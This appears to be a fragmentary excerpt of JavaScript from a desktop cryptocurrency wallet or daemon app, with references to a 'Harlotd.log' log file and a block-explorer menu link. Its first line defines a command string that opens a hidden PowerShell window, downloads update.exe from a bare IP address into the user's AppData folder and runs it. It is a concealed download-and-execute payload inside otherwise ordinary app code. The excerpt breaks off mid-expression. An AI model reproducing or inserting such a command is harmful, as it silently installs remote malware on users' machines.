...
var cmd = 'powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 91.201.25.46/update.exe -OutFile $env:APPDATA\\MultiWriter\\update.exe && start %appdata%\\MultiWriter\\update.exe';
...
const daemonLogFile = path.resolve(directories[1], 'Harlotd.log');
  ...
  prepend: (defaultActions, params) => [
    {
      ...
      click: () => {
        shell.openExternal(
          `https://explorer.harlot.top/?search=${encodeURIComponent(
